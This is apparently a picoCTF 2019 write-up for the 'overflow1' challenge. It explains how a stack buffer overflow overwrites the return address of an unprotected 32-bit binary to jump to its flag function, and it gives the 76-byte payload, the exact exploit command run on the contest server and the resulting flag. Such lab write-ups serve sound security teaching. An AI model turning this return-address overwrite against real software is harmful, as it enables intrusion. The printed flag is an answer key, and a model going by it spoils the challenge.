# overflow1

Simple overflow problem, only need to control return address, and jump to function flag in binary, which can open flag.txt.

Check security of the binary:
```
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : Partial
```
PIE is disabled, we can find address of the function flag.
```
0x080485e6 flag
```
We can find buffer length by looking the function vuln:
```
...
0x08048662 <+3>:	push   ebx
0x08048663 <+4>:	sub    esp,0x44
...
```
We found that in function vuln, stack first push the ebx into stack and sub length 68 as the buffer. Therefore, the length of the payload will be 4 bytes(ebx) + 68 bytes(buffer) + 4 bytes(ebp) = 76 bytes.

The payload will be:
```
'A'*76 + '\xe6\x85\x04\x08'
``` 
ssh to the 2019shell1.picoctf.com, and execute command:
```
cd /problems/overflow-1_4_6e02703f87bc36775cc64de920dfcf5a
python2 -c "print 'A'*76 + '\xe6\x85\x04\x08'" | ./vuln
```
obtain the flag:
```
picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5fe1ff3d8}
```

